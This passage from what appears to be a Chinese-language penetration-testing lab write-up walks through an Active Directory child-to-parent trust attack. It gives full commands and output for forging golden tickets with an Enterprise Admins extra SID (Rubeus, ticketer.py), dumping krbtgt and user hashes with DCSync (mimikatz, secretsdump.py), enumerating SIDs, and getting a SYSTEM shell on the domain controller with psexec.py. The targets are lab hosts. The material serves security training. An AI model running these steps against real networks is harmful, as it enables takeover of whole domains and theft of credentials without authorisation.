ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand</span><br><span class="line">	</span><br><span class="line">&lt;SNIP&gt; </span><br></pre></td></tr></table></figure>

<h3 id="使用-Rubeus-创建黄金票据"><a href="#使用-Rubeus-创建黄金票据" class="headerlink" title="使用 Rubeus 创建黄金票据"></a>使用 Rubeus 创建黄金票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt;  .\Rubeus.exe golden /rc4:<span class="number">9</span>d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S<span class="literal">-1-5-21-2806153819-209893948-922872689</span>  /sids:S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span> /user:hacker /ptt</span><br><span class="line"></span><br><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span> </span><br><span class="line"></span><br><span class="line">[*] Action: Build TGT</span><br><span class="line"></span><br><span class="line">[*] Building PAC</span><br><span class="line"></span><br><span class="line">[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)</span><br><span class="line">[*] SID            : S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br><span class="line">[*] UserId         : <span class="number">500</span></span><br><span class="line">[*] Groups         : <span class="number">520</span>,<span class="number">512</span>,<span class="number">513</span>,<span class="number">519</span>,<span class="number">518</span></span><br><span class="line">[*] ExtraSIDs      : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span></span><br><span class="line">[*] ServiceKey     : <span class="number">9</span>D765B482771505CBE97411065964D5F</span><br><span class="line">[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5</span><br><span class="line">[*] KDCKey         : <span class="number">9</span>D765B482771505CBE97411065964D5F</span><br><span class="line">[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5</span><br><span class="line">[*] Service        : krbtgt</span><br><span class="line">[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">[*] Generating EncTicketPart</span><br><span class="line">[*] Signing PAC</span><br><span class="line">[*] Encrypting EncTicketPart</span><br><span class="line">[*] Generating Ticket</span><br><span class="line">[*] Generated KERB<span class="literal">-CRED</span></span><br><span class="line">[*] Forged a TGT <span class="keyword">for</span> <span class="string">&#x27;hacker@LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] AuthTime       : <span class="number">3</span>/<span class="number">29</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">06</span>:<span class="number">41</span> AM</span><br><span class="line">[*] StartTime      : <span class="number">3</span>/<span class="number">29</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">06</span>:<span class="number">41</span> AM</span><br><span class="line">[*] EndTime        : <span class="number">3</span>/<span class="number">29</span>/<span class="number">2022</span> <span class="number">8</span>:<span class="number">06</span>:<span class="number">41</span> PM</span><br><span class="line">[*] RenewTill      : <span class="number">4</span>/<span class="number">5</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">06</span>:<span class="number">41</span> AM</span><br><span class="line"></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line">      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVGUkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTKOCBDIwggQuoAMCARehAwIBA6KCBCAEggQc0u5onpWKAP0Hw0KJuEOAFp8OgfBXlkwH3sXu5BhHT3zO/Ykw2Hkq2wsoODrBj0VfvxDNNpvysToaQdjHIqIqVQ9kXfNHM7bsQezS7L1KSx++<span class="number">2</span>iX94uRrwa/SVfgHhAuxKPlIi2phwjkxYETluKl26AUo2+WwxDXmXwGJ6LLWN1W4YGScgXAX+Kgs9xrAqJMabsAQqDfyk7+<span class="number">0</span>EH9SbmdQYqvAPrBqYEnt0mIPM9cakei5ZS1qfUDWjUN4mxsqINm7qNQcZHWN8kFSfAbqyD/OZIMcg78hZ8IYL+Y4LPEpiQzM8JsXqUdQtiJXM3Eig6RulSxCo9rc5YUWTaHx/i3PfWqP+dNREtldE2sgIUQm9f3cO1aOCt517Mmo7lICBFXUTQJvfGFtYdc01fWLoN45AtdpJro81GwihIFMcp/vmPBlqQGxAtRKzgzYacuk8YYogiP6815+x4vSZEL2JOJyLXSW0OPhguYSqAIEQshOkBm2p2jahQWYvCPPDd/EFM7S3NdMnJOzX3P7ObzVTAPQ/o9lSaXlopQH6L46z6PTcC/<span class="number">4</span>GwaRbqVnm1RU0O3VpVr5bgaR+Nas5VYGBYIHOw3Qx5YT3dtLvCxNa3cEgllr9N0BjCl1iQGWyFo72JYI9JLV0VAjnyRxFqHztiSctDExnwqWiyDaGET31PRdEz+HWlAi4Y56GaDPrSZFS1RHofKqehMQD6gNrIxWPHdS9aiMAnhQth8GKbLqimcVrCUG+eghE+CN999gHNMGBe1Vnz8Oc3DIM9FNLFVZiqJrAvsq2paakZnjf5HXOZ6EdqWkwiWpbGXv4qyuZ8jnUyHxavOOPDAHdVeo/RIfLx12GlLzN5y7132Rj4iZlkVgAyB6+PIpjuDLDSq6UJnHRkYlJ/<span class="number">3</span>l5j0KxgjdZbwoFbC7p76IPC3BaY97mXatvMfrrc/Aw5JaIFSaOYQ8M/frCG738e90IK/<span class="number">2</span>eTFZD9/kKXDgmwMowBEmT3IWj9lgOixNcNV/OPbuqR9QiT4psvzLGmd0jxu4JSm8Usw5iBiIuW/pwcHKFgL1hCBEtUkaWH24fuJuAIdei0r9DolImqC3sERVQ5VSc7u4oaAIyv7Acq+UrPMwnrkDrB6C7WBXiuoBAzPQULPTWih6LyAwenrpd0sOEOiPvh8NlvIHeOhKwWOY6GVpVWEShRLDl9/XLxdnRfnNZgn2SvHOAJfYbRgRHMWAfzA+<span class="number">2</span>+xps6WS/NNf1vZtUV/KRLlWsL5v91jmzGiZQcENkLeozZ7kIsY/zadFqVnrnQqsd97qcLYktZ4yOYpxH43JYS2e+cXZ+NXLKxex37HQF5aNP7EITdjQds0lbyb9K/iUY27iyw7dRVLz3y5Dic4S4+cvJBSz6Y1zJHpLkDfYVQbBUCfUps8ImJijHf+jggEhMIIBHaADAgEAooIBFASCARB9ggEMMIIBCKCCAQQwggEAMIH9oBswGaADAgEXoRIEEBrCyB2TJTKolmppTTXOXQShHxsdTE9HSVNUSUNTLklOTEFORUZSRUlHSFQuTE9DQUyiEzARoAMCAQGhCjAIGwZoYWNrZXKjBwMFAEDgAACkERgPMjAyMjAzMjkxNzA2NDFapREYDzIwMjIwMzI5MTcwNjQxWqYRGA8yMDIyMDMzMDAzMDY0MVqnERgPMjAyMjA0MDUxNzA2NDFaqB8bHUxPR0lTVElDUy5JTkxBTkVGUkVJR0hULkxPQ0FMqTIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTA==</span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>

<h3 id="使用-klist-确认票据在内存中"><a href="#使用-klist-确认票据在内存中" class="headerlink" title="使用 klist 确认票据在内存中"></a>使用 klist 确认票据在内存中</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is <span class="number">0</span>:<span class="number">0</span>xf6495</span><br><span class="line"></span><br><span class="line">Cached Tickets: (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;	Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL</span></span><br><span class="line">	Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL <span class="selector-tag">@</span> LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">	KerbTicket Encryption <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">	Ticket Flags <span class="number">0</span>x40e00000 -&gt; forwardable renewable initial pre_authent </span><br><span class="line">	<span class="built_in">Start</span> Time: <span class="number">3</span>/<span class="number">29</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">06</span>:<span class="number">41</span> (local)</span><br><span class="line">	<span class="keyword">End</span> Time:   <span class="number">3</span>/<span class="number">29</span>/<span class="number">2022</span> <span class="number">20</span>:<span class="number">06</span>:<span class="number">41</span> (local)</span><br><span class="line">	Renew Time: <span class="number">4</span>/<span class="number">5</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">06</span>:<span class="number">41</span> (local)</span><br><span class="line">	Session Key <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">	Cache Flags: <span class="number">0</span>x1 -&gt; PRIMARY </span><br><span class="line">	Kdc Called: </span><br></pre></td></tr></table></figure>

<h3 id="执行-DCSync-攻击"><a href="#执行-DCSync-攻击" class="headerlink" title="执行 DCSync 攻击"></a>执行 DCSync 攻击</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /user:INLANEFREIGHT\lab_adm</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT\lab_adm&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : lab_adm</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : lab_adm</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">53</span>:<span class="number">21</span> PM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1001</span></span><br><span class="line">Object Relative ID   : <span class="number">1001</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">663715</span>a1a8b957e8e9943cc98ea451b6</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">663715</span>a1a8b957e8e9943cc98ea451b6</span><br><span class="line">    ntlm- <span class="number">1</span>: <span class="number">663715</span>a1a8b957e8e9943cc98ea451b6</span><br><span class="line">    lm  - <span class="number">0</span>: <span class="number">6053227</span>db44e996fe16b107d9d1e95a0</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL</span></span><br><span class="line"></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT\lab_adm&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : lab_adm</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : lab_adm</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">53</span>:<span class="number">21</span> PM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1001</span></span><br><span class="line">Object Relative ID   : <span class="number">1001</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">663715</span>a1a8b957e8e9943cc98ea451b6</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">663715</span>a1a8b957e8e9943cc98ea451b6</span><br><span class="line">    ntlm- <span class="number">1</span>: <span class="number">663715</span>a1a8b957e8e9943cc98ea451b6</span><br><span class="line">    lm  - <span class="number">0</span>: <span class="number">6053227</span>db44e996fe16b107d9d1e95a0</span><br></pre></td></tr></table></figure>

<h2 id="Linux下域信任攻击"><a href="#Linux下域信任攻击" class="headerlink" title="Linux下域信任攻击"></a>Linux下域信任攻击</h2><h3 id="使用-secretsdump-py-执行-DCSync"><a href="#使用-secretsdump-py-执行-DCSync" class="headerlink" title="使用 secretsdump.py 执行 DCSync"></a>使用 secretsdump.py 执行 DCSync</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e</span><br><span class="line">krbtgt:des-cbc-md5:fee04c3d026d7538</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<h3 id="使用-lookupsid-py-进行-SID-暴力破解"><a href="#使用-lookupsid-py-进行-SID-暴力破解" class="headerlink" title="使用 lookupsid.py 进行 SID 暴力破解"></a>使用 lookupsid.py 进行 SID 暴力破解</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 </span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Brute forcing SIDs at 172.16.5.240</span><br><span class="line">[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]</span><br><span class="line">[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689</span><br><span class="line">500: LOGISTICS\Administrator (SidTypeUser)</span><br><span class="line">501: LOGISTICS\Guest (SidTypeUser)</span><br><span class="line">502: LOGISTICS\krbtgt (SidTypeUser)</span><br><span class="line">512: LOGISTICS\Domain Admins (SidTypeGroup)</span><br><span class="line">513: LOGISTICS\Domain Users (SidTypeGroup)</span><br><span class="line">514: LOGISTICS\Domain Guests (SidTypeGroup)</span><br><span class="line">515: LOGISTICS\Domain Computers (SidTypeGroup)</span><br><span class="line">516: LOGISTICS\Domain Controllers (SidTypeGroup)</span><br><span class="line">517: LOGISTICS\Cert Publishers (SidTypeAlias)</span><br><span class="line">520: LOGISTICS\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">521: LOGISTICS\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">522: LOGISTICS\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">525: LOGISTICS\Protected Users (SidTypeGroup)</span><br><span class="line">526: LOGISTICS\Key Admins (SidTypeGroup)</span><br><span class="line">553: LOGISTICS\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">571: LOGISTICS\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">572: LOGISTICS\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">1001: LOGISTICS\lab_adm (SidTypeUser)</span><br><span class="line">1002: LOGISTICS\ACADEMY-EA-DC02$ (SidTypeUser)</span><br><span class="line">1103: LOGISTICS\DnsAdmins (SidTypeAlias)</span><br><span class="line">1104: LOGISTICS\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">1105: LOGISTICS\INLANEFREIGHT$ (SidTypeUser)</span><br><span class="line">1106: LOGISTICS\htb-student_adm (SidTypeUser)</span><br></pre></td></tr></table></figure>

<h3 id="查找域安全标识符-Domain-SID"><a href="#查找域安全标识符-Domain-SID" class="headerlink" title="查找域安全标识符 (Domain SID)"></a>查找域安全标识符 (Domain SID)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep <span class="string">&quot;Domain SID&quot;</span></span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line"></span><br><span class="line">[*] Domain SID is: S-1-5-21-2806153819-209893948-92287268</span><br></pre></td></tr></table></figure>

<h3 id="获取域安全标识符（SID）并附加到企业管理员-RID"><a href="#获取域安全标识符（SID）并附加到企业管理员-RID" class="headerlink" title="获取域安全标识符（SID）并附加到企业管理员 RID"></a>获取域安全标识符（SID）并附加到企业管理员 RID</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 <span class="string">&quot;Enterprise Admins&quot;</span></span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114</span><br><span class="line">498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">500: INLANEFREIGHT\administrator (SidTypeUser)</span><br><span class="line">501: INLANEFREIGHT\guest (SidTypeUser)</span><br><span class="line">502: INLANEFREIGHT\krbtgt (SidTypeUser)</span><br><span class="line">512: INLANEFREIGHT\Domain Admins (SidTypeGroup)</span><br><span class="line">513: INLANEFREIGHT\Domain Users (SidTypeGroup)</span><br><span class="line">514: INLANEFREIGHT\Domain Guests (SidTypeGroup)</span><br><span class="line">515: INLANEFREIGHT\Domain Computers (SidTypeGroup)</span><br><span class="line">516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)</span><br><span class="line">517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)</span><br><span class="line">518: INLANEFREIGHT\Schema Admins (SidTypeGroup)</span><br><span class="line">519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)</span><br></pre></td></tr></table></figure>

<h3 id="使用-ticketer-py-构建黄金票据"><a href="#使用-ticketer-py-构建黄金票据" class="headerlink" title="使用 ticketer.py 构建黄金票据"></a>使用 ticketer.py 构建黄金票据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Creating basic skeleton ticket and PAC Infos</span><br><span class="line">[*] Customizing ticket <span class="keyword">for</span> LOGISTICS.INLANEFREIGHT.LOCAL/hacker</span><br><span class="line">[*] 	PAC_LOGON_INFO</span><br><span class="line">[*] 	PAC_CLIENT_INFO_TYPE</span><br><span class="line">[*] 	EncTicketPart</span><br><span class="line">[*] 	EncAsRepPart</span><br><span class="line">[*] Signing/Encrypting final ticket</span><br><span class="line">[*] 	PAC_SERVER_CHECKSUM</span><br><span class="line">[*] 	PAC_PRIVSVR_CHECKSUM</span><br><span class="line">[*] 	EncTicketPart</span><br><span class="line">[*] 	EncASRepPart</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> hacker.ccache</span><br></pre></td></tr></table></figure>

<h3 id="设置-KRB5CCNAME-环境变量-1"><a href="#设置-KRB5CCNAME-环境变量-1" class="headerlink" title="设置 KRB5CCNAME 环境变量"></a>设置 KRB5CCNAME 环境变量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ <span class="built_in">export</span> KRB5CCNAME=hacker.ccache </span><br></pre></td></tr></table></figure>

<h3 id="使用-Impacket-的-psexec-py-获取-SYSTEM-shell"><a href="#使用-Impacket-的-psexec-py-获取-SYSTEM-shell" class="headerlink" title="使用 Impacket 的 psexec.py 获取 SYSTEM shell"></a>使用 Impacket 的 psexec.py 获取 SYSTEM shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 172.16.5.5.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file nkYjGWDZ.exe</span><br><span class="line">[*] Opening SVCManager on 172.16.5.5.....</span><br><span class="line">[*] Creating service eTCU on 172.16.5.5.....</span><br><span class="line">[*] Starting service eTCU.....</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; hostname</span><br><span class="line">ACADEMY-EA-DC01</span><br></pre></td></tr></table></figure>

